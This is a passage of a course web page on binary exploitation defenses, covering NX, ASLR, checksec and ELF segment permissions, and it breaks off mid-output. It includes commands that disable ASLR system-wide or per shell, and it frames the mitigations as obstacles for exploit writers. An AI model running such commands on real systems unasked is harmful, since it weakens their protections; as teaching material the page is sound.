<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-Mitigation and Defensive Strategies/Defense Mechanisms/Reading/README">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.1.0">
<title data-rh="true">Defense Mechanisms | Binary Security</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Defense Mechanisms | Binary Security"><meta data-rh="true" name="description" content="Introduction"><meta data-rh="true" property="og:description" content="Introduction"><link data-rh="true" rel="canonical" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/" hreflang="en"><link data-rh="true" rel="alternate" href="http://open-education-hub.github.io/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/" hreflang="x-default"><link rel="stylesheet" href="/binary-security/assets/css/styles.a69a9d41.css">
<link rel="preload" href="/binary-security/assets/js/runtime~main.74200969.js" as="script">
<link rel="preload" href="/binary-security/assets/js/main.d9be8505.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="theme.common.skipToMainContent"><a href="#" class="skipToContent_fXgn">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/binary-security/"><div class="navbar__logo"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/binary-security/img/logo.svg" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Binary Security</b></a><a class="navbar__item navbar__link" href="/binary-security/Binary Analysis">Binary Analysis</a><a class="navbar__item navbar__link" href="/binary-security/Exploitation Techniques">Exploitation Techniques</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/binary-security/Mitigation and Defensive Strategies">Mitigation and Defensive Strategies</a><a class="navbar__item navbar__link" href="/binary-security/Extra">Extra</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebar_njMd"><nav class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/binary-security/">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Binary Analysis/">Binary Analysis</a><button aria-label="Toggle the collapsible sidebar category &#x27;Binary Analysis&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Exploitation Techniques/">Exploitation Techniques</a><button aria-label="Toggle the collapsible sidebar category &#x27;Exploitation Techniques&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/binary-security/Mitigation and Defensive Strategies/">Mitigation and Defensive Strategies</a><button aria-label="Toggle the collapsible sidebar category &#x27;Mitigation and Defensive Strategies&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/">Defense Mechanisms</a><button aria-label="Toggle the collapsible sidebar category &#x27;Defense Mechanisms&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/Reading/">Reading</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Information Leaks/">Information Leaks</a><button aria-label="Toggle the collapsible sidebar category &#x27;Information Leaks&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/binary-security/Mitigation and Defensive Strategies/Bypassing Mitigations/">Bypassing Mitigations</a><button aria-label="Toggle the collapsible sidebar category &#x27;Bypassing Mitigations&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/binary-security/Extra/">Extra</a><button aria-label="Toggle the collapsible sidebar category &#x27;Extra&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/binary-security/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_OVgt"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Mitigation and Defensive Strategies/"><span itemprop="name">Mitigation and Defensive Strategies</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/binary-security/Mitigation and Defensive Strategies/Defense Mechanisms/"><span itemprop="name">Defense Mechanisms</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Reading</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Defense Mechanisms</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a class="hash-link" href="#introduction" title="Direct link to heading">​</a></h2><p>The previous sessions (<a href="/binary-security/Exploitation Techniques/Shellcodes/Reading">Shellcodes</a> and <a href="/binary-security/Exploitation Techniques/Shellcodes Advanced/Reading">Shellcodes Advanced</a>) presented an exploitation scenario that is based on the assumption that machine instructions can be executed from <strong>any</strong> memory segment belonging to the process.
As you can recall from the <a href="/binary-security/Binary Analysis/Executables and Processes/Reading">Executable File Formats</a> session, different sections of an ELF binary are grouped into segments which are loaded into memory when the binary is being executed.
This mechanism (and some hardware support) enables 2 important protection mechanisms that will be presented in this session:</p><ul><li><em>Executable Space Protection</em>: only certain parts of the address space exhibit the code execution right;</li><li><em>Address Space Layout Randomization (<code>ASLR</code>)</em>: certain parts of the address space get mapped at random locations.</li></ul><p>In the <a href="/binary-security/Exploitation Techniques/Return-Oriented Programming/Reading">Return Oriented Programming</a> session we discussed how the <strong>PLT</strong>/<strong>GOT</strong> work in relation to resolving addresses of functions from dynamically liked libraries.
We also learned how to abuse this process and trigger arbitrary code execution by <strong>corrupting GOT entries</strong>.
We will take this exploit primitive to the next level and explore how it can be used when additional defense mechanisms are in use.</p><p>Next, we will introduce the `<code>RELRO</code> mitigation, which is designed to preclude the overwriting of relocation sections such as the GOT.</p><p>Another defense mechanism we will discuss is <code>seccomp</code>, which enables applications to enforce restrictions on the system calls performed in the process and child processes, thereby creating a sandbox.</p><p>Besides presenting these mechanisms, we are also going to take a quick look at how can we bypass them.
Since these protections are ubiquitous at this time, you will have to work around them almost every time you build a binary exploit.</p><p><strong>Important:</strong> The tasks today are designed for 32 bit executables.
Make sure you compile with the <code>-m32</code> flag for <code>gcc</code>.
The binaries in the tasks archive are already compiled as such.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="tutorials">Tutorials<a class="hash-link" href="#tutorials" title="Direct link to heading">​</a></h2><p>The tutorials will showcase the tools used to inspect the defense mechanisms.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="general-defense-mechanisms-check">General Defense Mechanisms Check<a class="hash-link" href="#general-defense-mechanisms-check" title="Direct link to heading">​</a></h3><p>The <code>checksec</code> command-line tool is a wrapper over the functionality implemented in pwntools&#x27; <code>pwnlib.elf.elf</code> module.</p><p>To get it to work in the Kali VM, you have to update pwntools to the latest version using:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip3 install -U pwntools</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We will use this tool throughout the session to identify which defense mechanisms are enabled for a certain binary:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@kali:~/demo/nx# checksec ./no_nx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] &#x27;/root/demo/nx/no_nx&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:     i386-32-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:    Full RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:    No canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX disabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:      PIE enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RWX:      Has RWX segments</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="executable-space-protection">Executable Space Protection<a class="hash-link" href="#executable-space-protection" title="Direct link to heading">​</a></h3><p>The <code>executable space protection</code> is an instance of the <code>principle of least privilege</code>, which is applied in many security sensitive domains.
In this case, the executable space protection is used to limit the types of memory access that a process is allowed to make during execution.
A memory region (i.e. page) can have the following protection levels: <strong>READ</strong>, <strong>WRITE</strong> and <strong>EXECUTE</strong>.
The executable space protection mechanism mandates that writable regions should not be executable at the same time.
This prevents code injection.</p><p>The mechanism can be (and was) implemented in many different ways, the most common in Linux being:</p><ul><li><strong><code>NX</code> bit</strong>: This is the easiest method, and involves an extra bit added to each page table entry that specifies if the memory page should be executable or not.
This is the current implementation in 64-bit processors where page table entries are 8-bytes wide.</li><li><strong>Physical Address Extension (<code>PAE</code>)</strong>: Besides the main feature that allows access to more than 4GB of memory, the PAE extension for 32-bit processor also adds a NX bit in its page table entries.</li><li><strong>Emulation</strong>: The <code>NX</code> bit can be emulated on older (i.e., non-PAE) 32-bit processors by overloading the Supervisor bit (<a href="https://en.wikipedia.org/wiki/PaX#PAGEEXEC" target="_blank" rel="noopener noreferrer"><code>PaX PAGEEXEC</code></a>), or by using the segmentation mechanism and splitting the address space in half (<a href="https://en.wikipedia.org/wiki/PaX#SEGMEXEC" target="_blank" rel="noopener noreferrer"><code>PaX SEGMEXEC</code></a>).</li></ul><p>This security feature gets in the way of <strong>just-in-time (<code>JIT</code>)</strong> compilers, which need to produce and write code at runtime, and that is later executed.
Since a JIT compiler cannot run in this kind of secured environment, an application using it is vulnerable to attacks known as <strong>JIT spraying</strong>.
The idea was first presented by Dionysus Blazakis, and is, briefly, a way to force the JIT compiler to produce shellcode.</p><ul><li>Slides: <a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf" target="_blank" rel="noopener noreferrer">Black Hat &amp; DEF CON 2010</a>;</li><li>Paper: <a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf" target="_blank" rel="noopener noreferrer">Interpreter Exploitation. Pointer Inference and JIT Spraying</a>.</li></ul><p>There are of course other implementations in different hardening-oriented projects such as: OpenBSD <a href="https://isopenbsdsecu.re/mitigations/wx/" target="_blank" rel="noopener noreferrer"><code>W^X</code></a>, Red Hat <a href="https://www.redhat.com/en/blog/security-technologies-execshield" target="_blank" rel="noopener noreferrer"><code>Exec Shield</code></a>, <code>PaX</code> (which is now part of <a href="https://grsecurity.net/" target="_blank" rel="noopener noreferrer"><code>grsecurity</code></a>), Windows Data Execution Prevention (<a href="https://docs.microsoft.com/en-us/windows/win32/memory/data-execution-prevention" target="_blank" rel="noopener noreferrer"><code>DEP</code></a>).</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="memory-segments-permissions-walkthrough">Memory Segments Permissions Walkthrough<a class="hash-link" href="#memory-segments-permissions-walkthrough" title="Direct link to heading">​</a></h3><p>The Linux kernel provides support for managing memory protections using the <code>mmap()</code> and <code>mprotect()</code> syscalls.
Simply put, what they do is:</p><ul><li><code>mmap()</code>: requests the OS to create a mapping (allocate space) inside the address space of the calling process.
See <a href="https://stackoverflow.com/questions/3642021/what-does-mmap-do" target="_blank" rel="noopener noreferrer">this answer</a>;</li><li><code>mprotect()</code>: requests the OS to set permissions over a memory region (e.g. <code>PROT_READ</code>, <code>PROT_WRITE</code>, <code>PROT_EXEC</code> and others).</li></ul><p>These syscalls are used by the loader to set protection levels for each segment it loads when running a binary.
Of course, the same functions can also be used during execution.</p><p>PaX has a protection option that restricts the use of <code>mprotect()</code> and <code>mmap()</code> to avoid resetting the permissions during execution.
See <a href="https://pax.grsecurity.net/docs/mprotect.txt" target="_blank" rel="noopener noreferrer"><code>MPROTECT</code></a>.
Note that <code>grsecurity</code> / <code>PaX</code> are patches to the kernel, and are not available in normal distributions.
You have to compile your own kernel if you want to try them out.</p><p>Let&#x27;s start by deactivating <code>ASLR</code>, which is going to be discussed in the following section of this tutorial, and only focus on the NX protection.
We can do this in two ways, as told below.</p><ul><li><p>To disable ASLR system-wide we use (root access is required):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo bash -c &#x27;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li><li><p>To create a shell with ASLR disabled (ASLR will also be disabled for future processes spawned from that shell), we use (root access is not required):</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">setarch $(uname -m) -R /bin/bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></li></ul><p>After disabling ASLR, let&#x27;s compile an extremely simple C application.
Save the following code as <code>hello.c</code>:</p><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Make sure you have both <code>build-essential</code> and <code>gcc-multilib</code> packages installed before going further (run <code>sudo apt install build-essential gcc-multilib</code> on Debian-based systems).</p><p>Compile the <code>hello.c</code> code using:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CFLAGS=&#x27;-m32 -O0&#x27; make hello</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The result should be a <code>hello</code> binary.</p><p>As presented in the <a href="/binary-security/Binary Analysis/Static Analysis/Reading">&quot;Static Analysis&quot; session</a>, the ELF format contains flags for each segment that specify what permissions should be granted.
You can use <code>readelf -l hello</code> to dump all program headers for this binary.
The result should be similar to:</p><div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Program Headers:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  LOAD           0x000000 0x08048000 0x08048000 0x00568 0x00568 R E 0x1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  GNU_EH_FRAME   0x000490 0x08048490 0x08048490 0x0002c 0x0002c R   0x4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Section to Segment mapping:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Segment Sections...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   01     .interp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   04     .dynamic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   05     .note.ABI-tag .note.gnu.build-id</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   06     